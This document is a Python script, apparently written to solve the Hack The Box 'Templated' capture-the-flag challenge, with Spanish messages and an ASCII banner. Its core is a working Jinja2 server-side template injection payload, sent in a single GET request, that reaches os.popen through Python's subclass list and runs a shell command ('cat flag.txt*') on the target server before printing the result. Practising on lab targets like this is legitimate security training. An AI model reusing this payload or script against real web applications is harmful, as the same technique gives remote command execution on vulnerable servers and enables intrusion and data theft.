import requests, argparse
from bs4 import BeautifulSoup

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

parse = argparse.ArgumentParser()
parse.add_argument('-u', '--url', help="Url del challenge HTB")
parse = parse.parse_args()

banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  _____ _____ __  __ ____  _        _  _____ _____ ____  
 |_   _| ____|  \/  |  _ \| |      / \|_   _| ____|  _ \ 
   | | |  _| | |\/| | |_) | |     / _ \ | | |  _| | | | |
   | | | |___| |  | |  __/| |___ / ___ \| | | |___| |_| |
   |_| |_____|_|  |_|_|   |_____/_/   \_\_| |_____|____/ 
  _   _ _____ ____                                       
 | | | |_   _| __ )                                      
 | |_| | | | |  _ \                                      
 |  _  | | | | |_) |                                     
 |_| |_| |_| |____/                                      
 BY: Alcatraz2033                                                         
"""

if parse.url:

    try:
        r = requests.get(parse.url + "%7B%7B%22%22.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[%22__builtins__%22][%22__import__%22](%22os%22).popen(%22cat%20flag.txt*%22).read()%7D%7D")
        p = BeautifulSoup(r.text, 'html5lib')
        print(GREEN + banner)
        print( GREEN + "[*]" + RESET + " " + p.find('str').string)
    except Exception as e:
        print(GREEN + banner)
        print(CYAN + "[+]" + RESET + " ERROR!!!\nEjemplo: python3 templatedHTB.py -u http://template.htb:9999/")
else:
    print(GREEN + banner)
    print(RED + "[!]" + RESET + " No ha ingresado la url")
    print(CYAN + "[+]" + RESET + " Ejemplo: python3 templatedHTB.py -u http://template.htb:9999/")
